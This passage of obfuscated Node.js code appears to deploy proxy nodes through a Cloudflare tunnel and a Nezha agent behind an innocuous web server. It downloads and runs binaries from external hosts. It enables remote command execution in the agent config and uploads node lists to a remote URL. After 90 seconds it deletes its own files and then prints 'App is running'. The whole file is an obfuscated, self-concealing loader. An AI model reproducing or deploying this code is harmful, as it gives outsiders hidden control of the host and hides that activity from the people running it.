ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','config.yaml','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://arm64.ssss.nyc.mn/bot','Nodes\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','freedom','tcp','2053','CFIP','SERVER_PORT','\x20-c\x20\x22','push','/api/add-nodes','\x20-c\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','127.0.0.1','\x20>\x20nul\x202>&1','/config.json\x20>/dev/null\x202>&1\x20&','data','3477055KmMyjP','https://amd64.ssss.nyc.mn/agent','10040079gazDeR','sub','mkdirSync','tunnel.json','set','includes','utf8','taskkill\x20/f\x20/im\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','&fp=firefox&type=ws&host=','path','statSync','PORT','chmod','config.json','utf-8','Subscription\x20uploaded\x20successfully','error','ARGO_DOMAIN:','7905999e-7c21-496b-a24b-a1a285b1fe02','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','readFile','tunnel.yml','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Skipping\x20adding\x20automatic\x20access\x20task','UPLOAD_URL','Content-Type','?encryption=none&security=tls&sni=','Download\x20'];_0x3765=function(){return _0x42e8dc;};return _0x3765();}async function uploadNodes(){const _0x560c15={_0x34910c:0x140,_0x1485ad:0x148,_0x20c6c3:0x143,_0x2ed6f7:0x1df},_0x3dcbf3=_0x391427;if(UPLOAD_URL&&PROJECT_URL){const _0x542d66=PROJECT_URL+'/'+SUB_PATH,_0x34e0df={'subscription':[_0x542d66]};try{const _0x2d59b4=await axios[_0x3dcbf3(0x13f)](UPLOAD_URL+_0x3dcbf3(0x13e),_0x34e0df,{'headers':{'Content-Type':_0x3dcbf3(0x1d5)}});return _0x2d59b4&&_0x2d59b4[_0x3dcbf3(_0x560c15._0x34910c)]===0xc8?(console[_0x3dcbf3(0x1df)](_0x3dcbf3(0x1a4)),_0x2d59b4):null;}catch(_0x3a3f27){if(_0x3a3f27[_0x3dcbf3(0x148)]){if(_0x3a3f27[_0x3dcbf3(_0x560c15._0x1485ad)][_0x3dcbf3(_0x560c15._0x34910c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3dcbf3(0x1bf)](listPath))return;const _0x4a11bf=fs[_0x3dcbf3(0x1f1)](listPath,_0x3dcbf3(0x1a3)),_0x356962=_0x4a11bf[_0x3dcbf3(_0x560c15._0x20c6c3)]('\x0a')[_0x3dcbf3(0x159)](_0x5e1069=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3dcbf3(0x1d9)](_0x5e1069));if(_0x356962[_0x3dcbf3(0x1c5)]===0x0)return;const _0x8fd4e3=JSON[_0x3dcbf3(0x14a)]({'nodes':_0x356962});try{const _0x120327=await axios['post'](UPLOAD_URL+_0x3dcbf3(0x18b),_0x8fd4e3,{'headers':{'Content-Type':'application/json'}});return _0x120327&&_0x120327[_0x3dcbf3(0x140)]===0xc8?(console[_0x3dcbf3(_0x560c15._0x2ed6f7)](_0x3dcbf3(0x182)),_0x120327):null;}catch(_0x455c5a){return null;}}else return;}}function _0x2445(_0x3a7360,_0x26a57f){const _0x37657a=_0x3765();return _0x2445=function(_0x244549,_0x17f4bf){_0x244549=_0x244549-0x13a;let _0xff52cf=_0x37657a[_0x244549];return _0xff52cf;},_0x2445(_0x3a7360,_0x26a57f);}function cleanFiles(){const _0x484b8f={_0x172d60:0x18a,_0x357b70:0x16c,_0x496290:0x172,_0x403ae7:0x1fd},_0x2bbeba={_0x3a813c:0x1df,_0x1d85a3:0x1de},_0x2015b3={_0x434ca1:0x1d0,_0x3fdd0b:0x1df};setTimeout(()=>{const _0x2c721a=_0x2445,_0x1aa194=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1aa194[_0x2c721a(_0x484b8f._0x172d60)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1aa194['push'](phpPath);process[_0x2c721a(0x1b8)]===_0x2c721a(0x16e)?exec(_0x2c721a(_0x484b8f._0x357b70)+_0x1aa194[_0x2c721a(0x172)]('\x20')+_0x2c721a(0x18f),_0x4e0df5=>{const _0x474117=_0x2c721a;console[_0x474117(_0x2015b3._0x434ca1)](),console['log']('App\x20is\x20running'),console[_0x474117(_0x2015b3._0x3fdd0b)](_0x474117(0x1de));}):exec(_0x2c721a(0x1bc)+_0x1aa194[_0x2c721a(_0x484b8f._0x496290)]('\x20')+_0x2c721a(_0x484b8f._0x403ae7),_0x16810d=>{const _0x4ae4b8=_0x2c721a;console[_0x4ae4b8(0x1d0)](),console[_0x4ae4b8(_0x2bbeba._0x3a813c)](_0x4ae4b8(0x1e6)),console['log'](_0x4ae4b8(_0x2bbeba._0x1d85a3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x97692f={_0x5b68d6:0x15e,_0x59fa12:0x1a5,_0x162ff7:0x1b6},_0x48604a=_0x391427;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x48604a(0x1df)](_0x48604a(0x1ac));return;}try{const _0x4d180d=await axios[_0x48604a(0x13f)](_0x48604a(_0x97692f._0x5b68d6),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x48604a(0x1df)](_0x48604a(0x16b)),_0x4d180d;}catch(_0x36b034){return console[_0x48604a(_0x97692f._0x59fa12)](_0x48604a(0x147)+_0x36b034[_0x48604a(_0x97692f._0x162ff7)]),null;}}async function startserver(){const _0x182203={_0x13ba12:0x1a5},_0x4ff726=_0x391427;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x178e78){console[_0x4ff726(_0x182203._0x13ba12)]('Error\x20in\x20startserver:',_0x178e78);}}startserver()[_0x391427(0x1da)](_0x318aa3=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x318aa3);}),app['get']('/',async function(_0x507c03,_0x43dfc0){const _0x55e765={_0xc6cf59:0x1f4,_0x3ec0cb:0x19a,_0x3d1688:0x16f},_0x5f0af1=_0x391427;try{const _0x27daa3=path[_0x5f0af1(0x172)](__dirname,'index.html'),_0xc85471=await fs[_0x5f0af1(_0x55e765._0xc6cf59)][_0x5f0af1(0x1a9)](_0x27daa3,_0x5f0af1(_0x55e765._0x3ec0cb));_0x43dfc0[_0x5f0af1(_0x55e765._0x3d1688)](_0xc85471);}catch(_0x17dede){_0x43dfc0[_0x5f0af1(_0x55e765._0x3d1688)](_0x5f0af1(0x1a8));}}),app['listen'](PORT,()=>console[_0x391427(0x1df)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
